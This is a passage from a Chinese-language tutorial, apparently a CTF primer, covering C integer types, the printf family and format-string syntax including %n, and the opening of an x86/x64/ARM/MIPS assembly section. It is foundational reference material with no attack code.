SHL\uff1a\u903b\u8f91\u5de6\u79fb\u6307\u4ee4 SHR\uff1a\u903b\u8f91\u53f3\u79fb\u6307\u4ee4 MOVZX\uff1a\u65e0\u7b26\u53f7\u6269\u5c55\u4f20\u9001\u6307\u4ee4 JB\uff1a\u5f53\u5c0f\u4e8e\u65f6\u8df3\u8f6c\u6307\u4ee4 JBE\uff1a\u5f53\u5c0f\u4e8e\u6216\u7b49\u4e8e\u65f6\u8df3\u8f6c\u6307\u4ee4 JA\uff1a\u5f53\u5927\u4e8e\u65f6\u8df3\u8f6c\u6307\u4ee4 JAE\uff1a\u5f53\u5927\u4e8e\u6216\u7b49\u4e8e\u65f6\u8df3\u8f6c\u6307\u4ee4 32 \u4f4d\u673a\u5668\u4e0a\u7684\u6574\u578b\u6570\u636e\u7c7b\u578b\uff0c\u4e0d\u540c\u7684\u7cfb\u7edf\u53ef\u80fd\u4f1a\u6709\u4e0d\u540c\uff1a C \u6570\u636e\u7c7b\u578b \u6700\u5c0f\u503c \u6700\u5927\u503c \u6700\u5c0f\u5927\u5c0f char -128 127 8 bits short -32 768 32 767 16 bits int -2 147 483 648 2 147 483 647 16 bits long -2 147 483 648 2 147 483 647 32 bits long long -9 223 372 036 854 775 808 9 223 372 036 854 775 807 64 bits \u56fa\u5b9a\u5927\u5c0f\u7684\u6570\u636e\u7c7b\u578b\uff1a int [# of bits]_t int8_t, int16_t, int32_t uint[# of bits]_t uint8_t, uint16_t, uint32_t \u6709\u7b26\u53f7\u6574\u6570 \u65e0\u7b26\u53f7\u6574\u6570 \u66f4\u591a\u4fe1\u606f\u5728 stdint.h \u548c limits.h \u4e2d\uff1a man stdint.h cat /usr/include/stdint.h man limits.h cat /usr/include/limits.h \u4e86\u89e3\u6574\u6570\u7684\u7b26\u53f7\u548c\u5927\u5c0f\u662f\u5f88\u6709\u7528\u7684\uff0c\u5728\u540e\u9762\u7684\u76f8\u5173\u7ae0\u8282\u4e2d\u6211\u4eec\u4f1a\u4ecb\u7ecd\u6574\u6570\u6ea2\u51fa\u7684\u5185\u5bb9\u3002 \u683c\u5f0f\u5316\u8f93\u51fa\u51fd\u6570 C \u6807\u51c6\u4e2d\u5b9a\u4e49\u4e86\u4e0b\u9762\u7684\u683c\u5f0f\u5316\u8f93\u51fa\u51fd\u6570\uff08\u53c2\u8003 man \uff13 printf \uff09\uff1a #include <stdio.h> int printf(const char *format, ...); int fprintf(FILE *stream, const char *format, ...); int dprintf(int fd, const char *format, ...); int sprintf(char *str, const char *format, ...); int snprintf(char *str, size_t size, const char *format, ...); #include <stdarg.h> int vprintf(const char *format, va_list ap); int vfprintf(FILE *stream, const char *format, va_list ap); int vdprintf(int fd, const char *format, va_list ap); int vsprintf(char *str, const char *format, va_list ap); int vsnprintf(char *str, size_t size, const char *format, va_list ap); fprintf() \u6309\u7167\u683c\u5f0f\u5b57\u7b26\u4e32\u7684\u5185\u5bb9\u5c06\u8f93\u51fa\u5199\u5165\u6d41\u4e2d\u3002\u4e09\u4e2a\u53c2\u6570\u4e3a\u6d41\u3001\u683c\u5f0f\u5b57\u7b26\u4e32\u548c\u53d8\u53c2\u5217\u8868\u3002 printf() \u7b49\u540c\u4e8e fprintf() \uff0c\u4f46\u662f\u5b83\u5047\u5b9a\u8f93\u51fa\u6d41\u4e3a stdout \u3002 sprintf() \u7b49\u540c\u4e8e fprintf() \uff0c\u4f46\u662f\u8f93\u51fa\u4e0d\u662f\u5199\u5165\u6d41\u800c\u662f\u5199\u5165\u6570\u7ec4\u3002\u5728\u5199\u5165\u7684\u5b57\u7b26\u4e32\u672b\u5c3e\u5fc5\u987b\u6dfb\u52a0\u4e00\u4e2a\u7a7a\u5b57\u7b26\u3002 snprintf() \u7b49\u540c\u4e8e sprintf() \uff0c\u4f46\u662f\u5b83\u6307\u5b9a\u4e86\u53ef\u5199\u5165\u5b57\u7b26\u7684\u6700\u5927\u503c size \u3002\u5f53 size \u5927\u4e8e\u96f6\u65f6\uff0c\u8f93\u51fa\u5b57\u7b26\u8d85\u8fc7\u7b2c size-1 \u7684\u90e8\u5206\u4f1a\u88ab\u820d\u5f03\u800c\u4e0d\u4f1a\u5199\u5165\u6570\u7ec4\u4e2d\uff0c\u5728\u5199\u5165\u6570\u7ec4\u7684\u5b57\u7b26\u4e32\u672b\u5c3e\u4f1a\u6dfb\u52a0\u4e00\u4e2a\u7a7a\u5b57\u7b26\u3002 dprintf() \u7b49\u540c\u4e8e fprintf() \uff0c\u4f46\u662f\u5b83\u8f93\u51fa\u4e0d\u662f\u6d41\u800c\u662f\u4e00\u4e2a\u6587\u4ef6\u63cf\u8ff0\u7b26 fd \u3002 vfprintf() \u3001 vprintf() \u3001 vsprintf() \u3001 vsnprintf() \u3001 vdprintf() \u5206\u522b\u4e0e\u4e0a\u9762\u7684\u51fd\u6570\u5bf9\u5e94\uff0c\u53ea\u662f\u5b83\u4eec\u5c06\u53d8\u53c2\u5217\u8868\u6362\u6210\u4e86 va_list \u7c7b\u578b\u7684\u53c2\u6570\u3002 \u683c\u5f0f\u5b57\u7b26\u4e32 \u683c\u5f0f\u5b57\u7b26\u4e32\u662f\u7531\u666e\u901a\u5b57\u7b26\uff08ordinary character\uff09\uff08\u5305\u62ec % \uff09\u548c\u8f6c\u6362\u89c4\u5219\uff08conversion specification\uff09\u6784\u6210\u7684\u5b57\u7b26\u5e8f\u5217\u3002\u666e\u901a\u5b57\u7b26\u88ab\u539f\u5c01\u4e0d\u52a8\u5730\u590d\u5236\u5230\u8f93\u51fa\u6d41\u4e2d\u3002\u8f6c\u6362\u89c4\u5219\u6839\u636e\u4e0e\u5b9e\u53c2\u5bf9\u5e94\u7684\u8f6c\u6362\u6307\u793a\u7b26\u5bf9\u5176\u8fdb\u884c\u8f6c\u6362\uff0c\u7136\u540e\u5c06\u7ed3\u679c\u5199\u5165\u8f93\u51fa\u6d41\u4e2d\u3002 \u4e00\u4e2a\u8f6c\u6362\u89c4\u5219\u6709\u53ef\u9009\u90e8\u5206\u548c\u5fc5\u9700\u90e8\u5206\u7ec4\u6210\uff1a %[ \u53c2\u6570 ][ \u6807\u5fd7 ][ \u5bbd\u5ea6 ][ .\u7cbe\u5ea6 ][ \u957f\u5ea6 ] \u8f6c\u6362\u6307\u793a\u7b26 \uff08\u5fc5\u9700\uff09\u8f6c\u6362\u6307\u793a\u7b26 \u5b57\u7b26 \u63cf\u8ff0 d , i \u6709\u7b26\u53f7\u5341\u8fdb\u5236\u6570\u503c int \u3002' %d ' \u4e0e ' %i ' \u5bf9\u4e8e\u8f93\u51fa\u662f\u540c\u4e49\uff1b\u4f46\u5bf9\u4e8e scanf() \u8f93\u5165\u4e8c\u8005\u4e0d\u540c\uff0c\u5176\u4e2d %i \u5728\u8f93\u5165\u503c\u6709\u524d\u7f00 0x \u6216 0 \u65f6\uff0c\u5206\u522b\u8868\u793a 16 \u8fdb\u5236\u6216 8 \u8fdb\u5236\u7684\u503c\u3002\u5982\u679c\u6307\u5b9a\u4e86\u7cbe\u5ea6\uff0c\u5219\u8f93\u51fa\u7684\u6570\u5b57\u4e0d\u8db3\u65f6\u5728\u5de6\u4fa7\u8865 0\u3002\u9ed8\u8ba4\u7cbe\u5ea6\u4e3a 1\u3002\u7cbe\u5ea6\u4e3a 0 \u4e14\u503c\u4e3a 0\uff0c\u5219\u8f93\u51fa\u4e3a\u7a7a u \u5341\u8fdb\u5236 unsigned int \u3002\u5982\u679c\u6307\u5b9a\u4e86\u7cbe\u5ea6\uff0c\u5219\u8f93\u51fa\u7684\u6570\u5b57\u4e0d\u8db3\u65f6\u5728\u5de6\u4fa7\u8865 0\u3002\u9ed8\u8ba4\u7cbe\u5ea6\u4e3a 1\u3002\u7cbe\u5ea6\u4e3a 0 \u4e14\u503c\u4e3a 0\uff0c\u5219\u8f93\u51fa\u4e3a\u7a7a f , F double \u578b\u8f93\u51fa 10 \u8fdb\u5236\u5b9a\u70b9\u8868\u793a\u3002' f ' \u4e0e ' F ' \u5dee\u5f02\u662f\u8868\u793a\u65e0\u7a77\u4e0e NaN \u65f6\uff0c' f ' \u8f93\u51fa ' inf ', ' infinity ' \u4e0e ' nan '\uff1b' F ' \u8f93\u51fa ' INF ', ' INFINITY ' \u4e0e ' NAN '\u3002\u5c0f\u6570\u70b9\u540e\u7684\u6570\u5b57\u4f4d\u6570\u7b49\u4e8e\u7cbe\u5ea6\uff0c\u6700\u540e\u4e00\u4f4d\u6570\u5b57\u56db\u820d\u4e94\u5165\u3002\u7cbe\u5ea6\u9ed8\u8ba4\u4e3a 6\u3002\u5982\u679c\u7cbe\u5ea6\u4e3a 0 \u4e14\u6ca1\u6709 # \u6807\u8bb0\uff0c\u5219\u4e0d\u51fa\u73b0\u5c0f\u6570\u70b9\u3002\u5c0f\u6570\u70b9\u5de6\u4fa7\u81f3\u5c11\u4e00\u4f4d\u6570\u5b57 e , E double \u503c\uff0c\u8f93\u51fa\u5f62\u5f0f\u4e3a 10 \u8fdb\u5236\u7684([ - ]d.ddd e [ + / - ]ddd). E \u7248\u672c\u4f7f\u7528\u7684\u6307\u6570\u7b26\u53f7\u4e3a E \uff08\u800c\u4e0d\u662f e \uff09\u3002\u6307\u6570\u90e8\u5206\u81f3\u5c11\u5305\u542b 2 \u4f4d\u6570\u5b57\uff0c\u5982\u679c\u503c\u4e3a 0\uff0c\u5219\u6307\u6570\u90e8\u5206\u4e3a 00\u3002Windows \u7cfb\u7edf\uff0c\u6307\u6570\u90e8\u5206\u81f3\u5c11\u4e3a 3 \u4f4d\u6570\u5b57\uff0c\u4f8b\u5982 1.5e002\uff0c\u4e5f\u53ef\u7528 Microsoft \u7248\u7684\u8fd0\u884c\u65f6\u51fd\u6570 _set_output_format \u4fee\u6539\u3002\u5c0f\u6570\u70b9\u524d\u5b58\u5728 1 \u4f4d\u6570\u5b57\u3002\u5c0f\u6570\u70b9\u540e\u7684\u6570\u5b57\u4f4d\u6570\u7b49\u4e8e\u7cbe\u5ea6\u3002\u7cbe\u5ea6\u9ed8\u8ba4\u4e3a 6\u3002\u5982\u679c\u7cbe\u5ea6\u4e3a 0 \u4e14\u6ca1\u6709 # \u6807\u8bb0\uff0c\u5219\u4e0d\u51fa\u73b0\u5c0f\u6570\u70b9 g , G double \u578b\u6570\u503c\uff0c\u7cbe\u5ea6\u5b9a\u4e49\u4e3a\u5168\u90e8\u6709\u6548\u6570\u5b57\u4f4d\u6570\u3002\u5f53\u6307\u6570\u90e8\u5206\u5728\u95ed\u533a\u95f4 [-4,\u7cbe\u5ea6] \u5185\uff0c\u8f93\u51fa\u4e3a\u5b9a\u70b9\u5f62\u5f0f\uff1b\u5426\u5219\u8f93\u51fa\u4e3a\u6307\u6570\u6d6e\u70b9\u5f62\u5f0f\u3002' g ' \u4f7f\u7528\u5c0f\u5199\u5b57\u6bcd\uff0c' G ' \u4f7f\u7528\u5927\u5199\u5b57\u6bcd\u3002\u5c0f\u6570\u70b9\u53f3\u4fa7\u7684\u5c3e\u6570 0 \u4e0d\u88ab\u663e\u793a\uff1b\u663e\u793a\u5c0f\u6570\u70b9\u4ec5\u5f53\u8f93\u51fa\u7684\u5c0f\u6570\u90e8\u5206\u4e0d\u4e3a 0 x , X 16 \u8fdb\u5236 unsigned int \u3002' x ' \u4f7f\u7528\u5c0f\u5199\u5b57\u6bcd\uff1b' X ' \u4f7f\u7528\u5927\u5199\u5b57\u6bcd\u3002\u5982\u679c\u6307\u5b9a\u4e86\u7cbe\u5ea6\uff0c\u5219\u8f93\u51fa\u7684\u6570\u5b57\u4e0d\u8db3\u65f6\u5728\u5de6\u4fa7\u8865 0\u3002\u9ed8\u8ba4\u7cbe\u5ea6\u4e3a 1\u3002\u7cbe\u5ea6\u4e3a 0 \u4e14\u503c\u4e3a 0\uff0c\u5219\u8f93\u51fa\u4e3a\u7a7a o 8 \u8fdb\u5236 unsigned int \u3002\u5982\u679c\u6307\u5b9a\u4e86\u7cbe\u5ea6\uff0c\u5219\u8f93\u51fa\u7684\u6570\u5b57\u4e0d\u8db3\u65f6\u5728\u5de6\u4fa7\u8865 0\u3002\u9ed8\u8ba4\u7cbe\u5ea6\u4e3a 1\u3002\u7cbe\u5ea6\u4e3a 0 \u4e14\u503c\u4e3a 0\uff0c\u5219\u8f93\u51fa\u4e3a\u7a7a s \u5982\u679c\u6ca1\u6709\u7528 l \u6807\u5fd7\uff0c\u8f93\u51fa null \u7ed3\u5c3e\u5b57\u7b26\u4e32\u76f4\u5230\u7cbe\u5ea6\u89c4\u5b9a\u7684\u4e0a\u9650\uff1b\u5982\u679c\u6ca1\u6709\u6307\u5b9a\u7cbe\u5ea6\uff0c\u5219\u8f93\u51fa\u6240\u6709\u5b57\u8282\u3002\u5982\u679c\u7528\u4e86 l \u6807\u5fd7\uff0c\u5219\u5bf9\u5e94\u51fd\u6570\u53c2\u6570\u6307\u5411 wchar_t \u578b\u7684\u6570\u7ec4\uff0c\u8f93\u51fa\u65f6\u628a\u6bcf\u4e2a\u5bbd\u5b57\u7b26\u8f6c\u5316\u4e3a\u591a\u5b57\u8282\u5b57\u7b26\uff0c\u76f8\u5f53\u4e8e\u8c03\u7528 wcrtomb \u51fd\u6570 c \u5982\u679c\u6ca1\u6709\u7528 l \u6807\u5fd7\uff0c\u628a int \u53c2\u6570\u8f6c\u4e3a unsigned char \u578b\u8f93\u51fa\uff1b\u5982\u679c\u7528\u4e86 l \u6807\u5fd7\uff0c\u628a wint_t \u53c2\u6570\u8f6c\u4e3a\u5305\u542b\u4e24\u4e2a\u5143\u7d20\u7684 wchart_t \u6570\u7ec4\uff0c\u5176\u4e2d\u7b2c\u4e00\u4e2a\u5143\u7d20\u5305\u542b\u8981\u8f93\u51fa\u7684\u5b57\u7b26\uff0c\u7b2c\u4e8c\u4e2a\u5143\u7d20\u4e3a null \u5bbd\u5b57\u7b26 p void * \u578b\uff0c\u8f93\u51fa\u5bf9\u5e94\u53d8\u91cf\u7684\u503c\u3002 printf(\"%p\", a) \u7528\u5730\u5740\u7684\u683c\u5f0f\u6253\u5370\u53d8\u91cf a \u7684\u503c\uff0c printf(\"%p\", &a) \u6253\u5370\u53d8\u91cf a \u6240\u5728\u7684\u5730\u5740 a , A double \u578b\u7684 16 \u8fdb\u5236\u8868\u793a\uff0c\"[\u2212]0xh.hhhh p\u00b1d\"\u3002\u5176\u4e2d\u6307\u6570\u90e8\u5206\u4e3a 10 \u8fdb\u5236\u8868\u793a\u7684\u5f62\u5f0f\u3002\u4f8b\u5982\uff1a1025.010 \u8f93\u51fa\u4e3a 0x1.004000p+10\u3002' a ' \u4f7f\u7528\u5c0f\u5199\u5b57\u6bcd\uff0c' A ' \u4f7f\u7528\u5927\u5199\u5b57\u6bcd n \u4e0d\u8f93\u51fa\u5b57\u7b26\uff0c\u4f46\u662f\u628a\u5df2\u7ecf\u6210\u529f\u8f93\u51fa\u7684\u5b57\u7b26\u4e2a\u6570\u5199\u5165\u5bf9\u5e94\u7684\u6574\u578b\u6307\u9488\u53c2\u6570\u6240\u6307\u7684\u53d8\u91cf % ' % ' \u5b57\u9762\u503c\uff0c\u4e0d\u63a5\u53d7\u4efb\u4f55\u9664\u4e86 \u53c2\u6570 \u4ee5\u5916\u7684\u90e8\u5206 \uff08\u53ef\u9009\uff09\u53c2\u6570 \u5b57\u7b26 \u63cf\u8ff0 n$ n \u662f\u7528\u8fd9\u4e2a\u683c\u5f0f\u8bf4\u660e\u7b26\u663e\u793a\u7b2c\u51e0\u4e2a\u53c2\u6570\uff1b\u8fd9\u4f7f\u5f97\u53c2\u6570\u53ef\u4ee5\u8f93\u51fa\u591a\u6b21\uff0c\u4f7f\u7528\u591a\u4e2a\u683c\u5f0f\u8bf4\u660e\u7b26\uff0c\u4ee5\u4e0d\u540c\u7684\u987a\u5e8f\u8f93\u51fa\u3002\u5982\u679c\u4efb\u610f\u4e00\u4e2a\u5360\u4f4d\u7b26\u4f7f\u7528\u4e86 \u53c2\u6570 \uff0c\u5219\u5176\u4ed6\u6240\u6709\u5360\u4f4d\u7b26\u5fc5\u987b\u4e5f\u4f7f\u7528 \u53c2\u6570 \u3002\u4f8b\uff1a printf(\"%2$d %2$#x; %1$d %1$#x\",16,17) \u4ea7\u751f \" 17 0x11; 16 0x10 \" \uff08\u53ef\u9009\uff09\u6807\u5fd7 \u5b57\u7b26 \u63cf\u8ff0 + \u603b\u662f\u8868\u793a\u6709\u7b26\u53f7\u6570\u503c\u7684 ' + ' \u6216 ' - ' \u53f7\uff0c\u7f3a\u7701\u60c5\u51b5\u662f\u5ffd\u7565\u6b63\u6570\u7684\u7b26\u53f7\u3002\u4ec5\u9002\u7528\u4e8e\u6570\u503c\u7c7b\u578b \u7a7a\u683c \u4f7f\u5f97\u6709\u7b26\u53f7\u6570\u7684\u8f93\u51fa\u5982\u679c\u6ca1\u6709\u6b63\u8d1f\u53f7\u6216\u8005\u8f93\u51fa 0 \u4e2a\u5b57\u7b26\uff0c\u5219\u524d\u7f00 1 \u4e2a\u7a7a\u683c\u3002\u5982\u679c\u7a7a\u683c\u4e0e ' + ' \u540c\u65f6\u51fa\u73b0\uff0c\u5219\u7a7a\u683c\u8bf4\u660e\u7b26\u88ab\u5ffd\u7565 - \u5de6\u5bf9\u9f50\u3002\u7f3a\u7701\u60c5\u51b5\u662f\u53f3\u5bf9\u9f50 # \u5bf9\u4e8e ' g ' \u4e0e ' G '\uff0c\u4e0d\u5220\u9664\u5c3e\u90e8 0 \u4ee5\u8868\u793a\u7cbe\u5ea6\u3002\u5bf9\u4e8e ' f ', ' F ', ' e ', ' E ', ' g ', ' G ', \u603b\u662f\u8f93\u51fa\u5c0f\u6570\u70b9\u3002\u5bf9\u4e8e ' o ', ' x ', ' X ', \u5728\u975e 0 \u6570\u503c\u524d\u5206\u522b\u8f93\u51fa\u524d\u7f00 0 , 0x \u548c 0X \u8868\u793a\u6570\u5236 0 \u5982\u679c \u5bbd\u5ea6 \u9009\u9879\u524d\u7f00\u4e3a 0 \uff0c\u5219\u5728\u5de6\u4fa7\u7528 0 \u586b\u5145\u76f4\u81f3\u8fbe\u5230\u5bbd\u5ea6\u8981\u6c42\u3002\u4f8b\u5982 printf(\"%2d\", 3) \u8f93\u51fa \" 3 \"\uff0c\u800c printf(\"%02d\", 3) \u8f93\u51fa \" 03 \"\u3002\u5982\u679c 0 \u4e0e - \u5747\u51fa\u73b0\uff0c\u5219 0 \u88ab\u5ffd\u7565\uff0c\u5373\u5de6\u5bf9\u9f50\u4f9d\u7136\u7528\u7a7a\u683c\u586b\u5145 \uff08\u53ef\u9009\uff09\u5bbd\u5ea6 \u662f\u4e00\u4e2a\u7528\u6765\u6307\u5b9a\u8f93\u51fa\u5b57\u7b26\u7684\u6700\u5c0f\u4e2a\u6570\u7684\u5341\u8fdb\u5236\u975e\u8d1f\u6574\u6570\u3002\u5982\u679c\u5b9e\u9645\u4f4d\u6570\u591a\u4e8e\u5b9a\u4e49\u7684\u5bbd\u5ea6,\u5219\u6309\u5b9e\u9645\u4f4d\u6570\u8f93\u51fa\uff1b\u5982\u679c\u5b9e\u9645\u4f4d\u6570\u5c11\u4e8e\u5b9a\u4e49\u7684\u5bbd\u5ea6\u5219\u8865\u4ee5\u7a7a\u683c\u6216 0\u3002 \uff08\u53ef\u9009\uff09\u7cbe\u5ea6 \u7cbe\u5ea6\u662f\u7528\u6765\u6307\u793a\u6253\u5370\u5b57\u7b26\u4e2a\u6570\u3001\u5c0f\u6570\u4f4d\u6570\u6216\u8005\u6709\u6548\u6570\u5b57\u4e2a\u6570\u7684\u975e\u8d1f\u5341\u8fdb\u5236\u6574\u6570\u3002\u5bf9\u4e8e d \u3001 i \u3001 u \u3001 x \u3001 o \u7684\u6574\u578b\u6570\u503c\uff0c\u662f\u6307\u6700\u5c0f\u6570\u5b57\u4f4d\u6570\uff0c\u4e0d\u8db3\u7684\u4f4d\u8981\u5728\u5de6\u4fa7\u8865 0\uff0c\u5982\u679c\u8d85\u8fc7\u4e5f\u4e0d\u622a\u65ad\uff0c\u7f3a\u7701\u503c\u4e3a 1\u3002\u5bf9\u4e8e a , A , e , E , f , F \u7684\u6d6e\u70b9\u6570\u503c\uff0c\u662f\u6307\u5c0f\u6570\u70b9\u53f3\u8fb9\u663e\u793a\u7684\u6570\u5b57\u4f4d\u6570\uff0c\u5fc5\u8981\u65f6\u56db\u820d\u4e94\u5165\uff1b\u7f3a\u7701\u503c\u4e3a 6\u3002\u5bf9\u4e8e g , G \u7684\u6d6e\u70b9\u6570\u503c\uff0c\u662f\u6307\u6709\u6548\u6570\u5b57\u7684\u6700\u5927\u4f4d\u6570\u3002\u5bf9\u4e8e s \u7684\u5b57\u7b26\u4e32\u7c7b\u578b\uff0c\u662f\u6307\u8f93\u51fa\u7684\u5b57\u8282\u7684\u4e0a\u9650\uff0c\u8d85\u51fa\u9650\u5236\u7684\u5176\u5b83\u5b57\u7b26\u5c06\u88ab\u622a\u65ad\u3002\u5982\u679c\u57df\u5bbd\u4e3a * \uff0c\u5219\u7531\u5bf9\u5e94\u7684\u51fd\u6570\u53c2\u6570\u7684\u503c\u4e3a\u5f53\u524d\u57df\u5bbd\u3002\u5982\u679c\u4ec5\u7ed9\u51fa\u4e86\u5c0f\u6570\u70b9\uff0c\u5219\u57df\u5bbd\u4e3a 0\u3002 \uff08\u53ef\u9009\uff09\u957f\u5ea6 \u5b57\u7b26 \u63cf\u8ff0 hh \u5bf9\u4e8e\u6574\u6570\u7c7b\u578b\uff0c printf \u671f\u5f85\u4e00\u4e2a\u4ece char \u63d0\u5347\u7684 int \u6574\u578b\u53c2\u6570 h \u5bf9\u4e8e\u6574\u6570\u7c7b\u578b\uff0c printf \u671f\u5f85\u4e00\u4e2a\u4ece short \u63d0\u5347\u7684 int \u6574\u578b\u53c2\u6570 l \u5bf9\u4e8e\u6574\u6570\u7c7b\u578b\uff0c printf \u671f\u5f85\u4e00\u4e2a long \u6574\u578b\u53c2\u6570\u3002\u5bf9\u4e8e\u6d6e\u70b9\u7c7b\u578b\uff0c printf \u671f\u5f85\u4e00\u4e2a double \u6574\u578b\u53c2\u6570\u3002\u5bf9\u4e8e\u5b57\u7b26\u4e32 s \u7c7b\u578b\uff0c printf \u671f\u5f85\u4e00\u4e2a wchar_t \u6307\u9488\u53c2\u6570\u3002\u5bf9\u4e8e\u5b57\u7b26 c \u7c7b\u578b\uff0c printf \u671f\u5f85\u4e00\u4e2a wint_t \u578b\u7684\u53c2\u6570 ll \u5bf9\u4e8e\u6574\u6570\u7c7b\u578b\uff0c printf \u671f\u5f85\u4e00\u4e2a long long \u6574\u578b\u53c2\u6570\u3002Microsoft \u4e5f\u53ef\u4ee5\u4f7f\u7528 I64 L \u5bf9\u4e8e\u6d6e\u70b9\u7c7b\u578b\uff0c printf \u671f\u5f85\u4e00\u4e2a long double \u6574\u578b\u53c2\u6570 z \u5bf9\u4e8e\u6574\u6570\u7c7b\u578b\uff0c printf \u671f\u5f85\u4e00\u4e2a size_t \u6574\u578b\u53c2\u6570 j \u5bf9\u4e8e\u6574\u6570\u7c7b\u578b\uff0c printf \u671f\u5f85\u4e00\u4e2a intmax_t \u6574\u578b\u53c2\u6570 t \u5bf9\u4e8e\u6574\u6570\u7c7b\u578b\uff0c printf \u671f\u5f85\u4e00\u4e2a ptrdiff_t \u6574\u578b\u53c2\u6570 \u4f8b\u5b50 printf(\"Hello %%\"); // \"Hello %\" printf(\"Hello World!\"); // \"Hello World!\" printf(\"Number: %d\", 123); // \"Number: 123\" printf(\"%s %s\", \"Format\", \"Strings\"); // \"Format Strings\" printf(\"%12c\", 'A'); // \" A\" printf(\"%16s\", \"Hello\"); // \" Hello!\" int n; printf(\"%12c%n\", 'A', &n); // n = 12 printf(\"%16s%n\", \"Hello!\", &n); // n = 16 printf(\"%2$s %1$s\", \"Format\", \"Strings\"); // \"Strings Format\" printf(\"%42c%1$n\", &n); // \u9996\u5148\u8f93\u51fa41\u4e2a\u7a7a\u683c\uff0c\u7136\u540e\u8f93\u51fa n \u7684\u4f4e\u516b\u4f4d\u5730\u5740\u4f5c\u4e3a\u4e00\u4e2a\u5b57\u7b26 \u8fd9\u91cc\u6211\u4eec\u5bf9\u683c\u5f0f\u5316\u8f93\u51fa\u51fd\u6570\u548c\u683c\u5f0f\u5b57\u7b26\u4e32\u6709\u4e86\u4e00\u4e2a\u8be6\u7ec6\u7684\u8ba4\u8bc6\uff0c\u540e\u9762\u7684\u7ae0\u8282\u4e2d\u6211\u4eec\u4f1a\u4ecb\u7ecd\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\u5185\u5bb9\u3002 \u6c47\u7f16\u8bed\u8a00 \u6c47\u7f16\u8bed\u8a00 3.3 X86 \u6c47\u7f16\u57fa\u7840 3.3.2 \u5bc4\u5b58\u5668 Registers 3.3.3 \u5185\u5b58\u548c\u5bfb\u5740\u6a21\u5f0f Memory and Addressing Modes 3.3.3.1 \u58f0\u660e\u9759\u6001\u6570\u636e\u533a\u57df 3.3.3.2 \u5185\u5b58\u5bfb\u5740 3.3.3.3 \u64cd\u4f5c\u540e\u7f00 3.3.4 \u6307\u4ee4 Instructions 3.3.4.1 \u6570\u636e\u79fb\u52a8\u6307\u4ee4 3.3.4.2 \u903b\u8f91\u8fd0\u7b97\u6307\u4ee4 3.3.4.3 \u6d41\u7a0b\u63a7\u5236\u6307\u4ee4 3.3.5 \u8c03\u7528\u7ea6\u5b9a Calling Convention 3.3.5.1 \u8c03\u7528\u8005\u7ea6\u5b9a Caller Rules 3.3.5.2 \u88ab\u8c03\u7528\u8005\u7ea6\u5b9a Callee Rules 3.4 x64 \u6c47\u7f16\u57fa\u7840 3.4.1 \u5bfc\u8bed 3.4.2 \u5bc4\u5b58\u5668 Registers 3.4.3 \u5bfb\u5740\u6a21\u5f0f Addressing modes 3.4.4 \u901a\u7528\u6307\u4ee4 Common instructions mov \u548c lea \u6307\u4ee4 \u7b97\u672f\u548c\u4f4d\u8fd0\u7b97 \u6d41\u7a0b\u63a7\u5236\u6307\u4ee4 setx \u548c movx \u51fd\u6570\u8c03\u7528\u4e0e\u6808 3.4.5 \u6c47\u7f16\u548c gdb 3.5 ARM\u6c47\u7f16\u57fa\u7840 3.5.1 \u5f15\u8a00 3.5.2 ARM \u7684 GNU \u6c47\u7f16\u7a0b\u5e8f\u6307\u4ee4\u8868 3.5.3 \u5bc4\u5b58\u5668\u540d\u79f0 3.5.4 \u6c47\u7f16\u7a0b\u5e8f\u7279\u6b8a\u5b57\u7b26/\u8bed\u6cd5 3.5.5 arm\u7a0b\u5e8f\u8c03\u7528\u6807\u51c6 3.5.6 \u5bfb\u5740\u6a21\u5f0f 3.5.7 \u673a\u5668\u76f8\u5173\u6307\u4ee4 3.6 MIPS\u6c47\u7f16\u57fa\u7840 \u6570\u636e\u7c7b\u578b\u548c\u5e38\u91cf \u5bc4\u5b58\u5668 \u7a0b\u5e8f\u7ed3\u6784 \u6570\u636e\u58f0\u660e \u4ee3\u7801 \u6ce8\u91ca \u53d8\u91cf\u58f0\u660e \u8bfb\u53d6/\u5199\u5165 ( Load/Store )\u6307\u4ee4 \u95f4\u63a5\u548c\u7acb\u5373\u5bfb\u5740 \u7b97\u672f\u6307\u4ee4 \u6d41\u7a0b\u63a7\u5236 \u7cfb\u7edf\u8c03\u7528\u548c I / O\uff08 \u9488\u5bf9 SPIM \u6a21\u62df\u5668 \uff09 3.3 X86 \u6c47\u7f16\u57fa\u7840 3.3.2 \u5bc4\u5b58\u5668 Registers \u73b0\u4ee3 ( 386\u53ca\u4ee5\u4e0a\u7684\u673a\u5668 )x86 \u5904\u7406\u5668\u6709 8 \u4e2a 32 \u4f4d\u901a\u7528\u5bc4\u5b58\u5668, \u5982\u56fe 1 \u6240\u793a. \u8fd9\u4e9b\u5bc4\u5b58\u5668\u7684\u540d\u5b57\u90fd\u662f\u6709\u70b9\u5386\u53f2\u7684, \u4f8b\u5982 EAX \u8fc7\u53bb\u88ab\u79f0\u4e3a \u7d2f\u52a0\u5668 , \u56e0\u4e3a\u5b83\u88ab\u7528\u6765\u4f5c\u5f88\u591a\u7b97\u672f\u8fd0\u7b97, \u8fd8\u6709 ECX \u88ab\u79f0\u4e3a \u8ba1\u6570\u5668 , \u56e0\u4e3a\u5b83\u88ab\u7528\u6765\u4fdd\u5b58\u5faa\u73af\u7684\u7d22\u5f15 ( \u5c31\u662f\u5faa\u73af\u6b21\u6570 ). \u5c3d\u7ba1\u5927\u591a\u662f\u5bc4\u5b58\u5668\u5728\u73b0\u4ee3\u6307\u4ee4\u96c6\u4e2d\u5df2\u7ecf\u5931\u53bb\u4e86\u5b83\u4eec\u7684\u7279\u6b8a\u7528\u9014, \u4f46\u662f\u6309\u7167\u60ef\u4f8b, \u5176\u4e2d\u6709\u4e24\u4e2a\u5bc4\u5b58\u5668\u8fd8\u662f\u6709\u5b83\u4eec\u7684\u7279\u6b8a\u7528\u9014 --- ESP \u548c EBP. \u5bf9\u4e8e EAS , EBX , ECX \u8fd8\u6709 EDX \u5bc4\u5b58\u5668, \u5b83\u4eec\u53ef\u4ee5\u88ab\u5206\u6bb5\u5f00\u6765\u4f7f\u7528. \u4f8b\u5982, \u53ef\u4ee5\u5c06 EAX \u7684\u6700\u4f4e\u7684 2 \u4f4d\u5b57\u8282\u89c6\u4e3a 16 \u4f4d\u5bc4\u5b58\u5668 ( AX ). \u8fd8\u53ef\u4ee5\u5c06 AX \u7684\u6700\u4f4e\u4f4d\u7684 1 \u4e2a\u5b57\u8282\u770b\u6210 8 \u4f4d\u5bc4\u5b58\u5668\u6765\u7528 ( AL ), \u5f53\u7136 AX \u7684\u9ad8\u4f4d\u7684 1 